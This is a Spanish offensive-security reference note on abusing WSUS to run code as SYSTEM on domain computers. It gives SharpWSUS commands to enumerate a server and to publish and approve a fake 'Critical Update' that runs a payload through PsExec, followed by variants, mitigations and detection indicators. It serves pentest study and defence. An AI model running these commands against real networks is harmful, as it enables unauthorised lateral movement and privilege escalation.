---
topic: Abuso de WSUS para ejecución remota
tags: [windows, wsus, active-directory, privesc, sharpwsus]
---

# Abuso de WSUS para ejecución remota

[🇬🇧 English](wsus-abuse.en.md) | **Español**

## Concepto

Windows Server Update Services (WSUS) distribuye actualizaciones a los equipos de un dominio. Un administrador de WSUS puede publicar una actualización local y aprobarla para un equipo; el cliente la descarga y ejecuta el binario asociado. Si el atacante controla una cuenta con privilegios de publicación, puede usar un binario firmado por Microsoft como `PsExec.exe` para ejecutar código como SYSTEM en el host objetivo.

## Cuándo aplica

- El dominio tiene WSUS y los clientes lo usan (`WUServer` en el registro).
- La cuenta comprometida pertenece a `WSUS Administrators` o puede publicar actualizaciones.
- El atacante puede alcanzar el puerto 8530/8531 y el cliente hará check-in.

## Requisitos y condiciones

1. Acceso autenticado al servidor WSUS.
2. Capacidad de crear y aprobar una actualización para el equipo objetivo.
3. Un payload firmado por Microsoft (Sysinternals) o una cadena que use uno.
4. Que el cliente acepte la actualización y ejecute el instalador.

## Procedimiento

Enumerar el servidor desde el host comprometido:

```powershell
Get-ItemProperty HKLM:\software\policies\microsoft\windows\WindowsUpdate
.\SharpWSUS.exe locate
.\SharpWSUS.exe inspect
```

Crear la actualización con un binario firmado y argumentos:

```powershell
.\SharpWSUS.exe create /payload:'C:\ProgramData\PsExec.exe' \
  /args:'-accepteula -s -d C:\ProgramData\payload.exe' \
  /title:'Critical Update'
```

Aprobar para el equipo o grupo:

```powershell
.\SharpWSUS.exe approve /updateid:<ID> /computername:<FQDN> /groupname:'<GROUP>'
.\SharpWSUS.exe check /updateid:<ID> /computername:<FQDN>
```

El cliente descarga el binario, lo ejecuta como SYSTEM y devuelve la shell o completa la acción.

## Variantes

- **WSUSpendu**: publica un binario firmado y lo aprueba; útil cuando no se tiene la consola de SharpWSUS.
- **PsExec como payload**: no requiere firma propia porque PsExec ya está firmado.
- **Aprovechar `WSUSTemp`/`WsusContent`**: shares de publicación; su acceso depende de la configuración.
- **Ataque a la consola**: si el atacante puede modificar la base de datos de WSUS, puede inyectar actualizaciones sin la interfaz.

## Limitaciones

- WSUS solo ejecuta binarios firmados por Microsoft; un EXE propio no se ejecutará.
- El cliente debe hacer check-in; puede tardar o requerir un `gpupdate`/reinicio.
- La actualización debe aprobarse para el equipo correcto.
- Un WSUS con HTTPS y validación estricta puede bloquear la publicación local.

## Mitigación

- Separar `WSUS Administrators` de cuentas de usuario y aplicar MFA a la consola.
- Publicar solo actualizaciones firmadas y con origen verificado.
- Usar HTTPS, restringir 8530/8531 y segmentar el servidor WSUS.
- Auditar los grupos con permiso de publicación y las GPO de Windows Update.

## Detección

- Evento 7045 (nuevo servicio) y ejecución de `PsExec` desde `C:\ProgramData`.
- Procesos hijos de `wuauclt.exe`/`TrustedInstaller.exe` que lanzan binarios inesperados.
- Nuevas actualizaciones locales en la base de datos de WSUS y aprobaciones fuera de la ventana de cambios.
- Conexiones al 8530 desde hosts que no son servidores de administración.

MITRE ATT&CK: T1072 (Software Deployment Tools), T1068 (Exploitation for Privilege Escalation), T1543.003 (Windows Service).

## Referencias

- <https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services>
- <https://github.com/Th3M3/SharpWSUS>
- <https://attack.mitre.org/techniques/T1072/>
